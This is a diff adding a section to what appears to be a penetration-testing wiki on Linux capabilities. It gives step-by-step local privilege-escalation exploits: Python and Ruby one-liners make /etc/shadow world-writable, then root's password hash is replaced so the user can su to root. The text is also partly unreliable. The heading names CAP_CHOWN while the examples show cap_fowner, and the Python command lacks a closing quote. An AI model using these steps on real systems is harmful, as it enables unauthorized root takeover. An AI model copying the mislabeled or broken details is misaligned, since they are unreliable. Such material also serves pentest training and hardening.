@@ -797,13 +797,89 @@ su - root
 
 {% tabs %}
 {% tab title="Desc" %}
+[**CAP\_CHOWN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) allow us to bypass permission checks on operations that normally require the filesystem UID of the process to match the UID of the file. excluding those operations covered by `CAP_DAC_OVERRIDE` and `CAP_DAC_READ_SEARCH`. Additionally it allow us to set inode flags, ACLs on arbitrary files, ignore the directory sticky bit on file deletion.
 
+**This means that it's possible to change the permission of any file.**
 {% endtab %}
 
-{% tab title="Exploit" %}
+{% tab title="Exploit - Python" %}
+In the following example the **`python`** binary has this capability.&#x20;
 
+```bash
+$ getcap -r / 2>/dev/null
+/usr/bin/python3.11 = cap_fowner+ep
+```
+
+We can abuse it to modify the file permissions of the `/etc/shadow`. First generate a new hash
+```bash
+#Using mkpasswd
+$ mkpasswd  -m sha-512 -S saltsalt -s
+Mot de passe : password1
+$6$saltsalt$rGHbrrsOT1WLTt4dcfZKq1FiG//1B7ZAMkD.MeAC8/d9MOtB5EzYEffFnBarQhF6MiLywY/KggaYjrNNrzAnj/
+
+#Or with openssl
+$ openssl passwd -6 password1
+$6$5h9QsTjUEHVIFVwK$3MkSX5prCEkZax7z5ixV1hdmAghcAGTjX2gAyMFjcAYxYQ00H7xQvskRRi/y.0ouz0sRpqGUWzORK0MdAGv7b0
+```
+
+Give us permissions over the `/etc/shadow` file
+```bash
+$ python -c 'import os;os.chmod("/etc/shadow",0666)
+```
+
+And edit the `/etc/shadow` file to change the root password
+```bash
+#Replace the hash
+$ vim /etc/shadow
+$ head -n1 /etc/shadow
+root:$6$saltsalt$rGHbrrsOT1WLTt4dcfZKq1FiG//1B7ZAMkD.MeAC8/d9MOtB5EzYEffFnBarQhF6MiLywY/KggaYjrNNrzAnj/:17673:0:99999:7:::
+```
+
+We can now easily `su` as root
+```bash
+su - root
+```
+{% endtab %}
+{% tab title="Exploit - Ruby" %}
+In the following example the **`ruby`** binary has this capability.&#x20;
+
+```bash
+$ getcap -r / 2>/dev/null
+/usr/bin/ruby = cap_fowner+ep
+```
+
+We can abuse it to modify the file permissions of the `/etc/shadow`. First generate a new hash
+```bash
+#Using mkpasswd
+$ mkpasswd  -m sha-512 -S saltsalt -s
+Mot de passe : password1
+$6$saltsalt$rGHbrrsOT1WLTt4dcfZKq1FiG//1B7ZAMkD.MeAC8/d9MOtB5EzYEffFnBarQhF6MiLywY/KggaYjrNNrzAnj/
+
+#Or with openssl
+$ openssl passwd -6 password1
+$6$5h9QsTjUEHVIFVwK$3MkSX5prCEkZax7z5ixV1hdmAghcAGTjX2gAyMFjcAYxYQ00H7xQvskRRi/y.0ouz0sRpqGUWzORK0MdAGv7b0
+```
+
+Give us permissions over the `/etc/shadow` file
+```bash
+$ ruby -e 'require "fileutils"; FileUtils.chmod(0666, "/etc/shadow")'
+```
+
+And edit the `/etc/shadow` file to change the root password
+```bash
+#Replace the hash
+$ vim /etc/shadow
+$ head -n1 /etc/shadow
+root:$6$saltsalt$rGHbrrsOT1WLTt4dcfZKq1FiG//1B7ZAMkD.MeAC8/d9MOtB5EzYEffFnBarQhF6MiLywY/KggaYjrNNrzAnj/:17673:0:99999:7:::
+```
+
+We can now easily `su` as root
+```bash
+su - root
+```
 {% endtab %}
 {% endtabs %}
+
 
 #### CAP\_SETUID
 
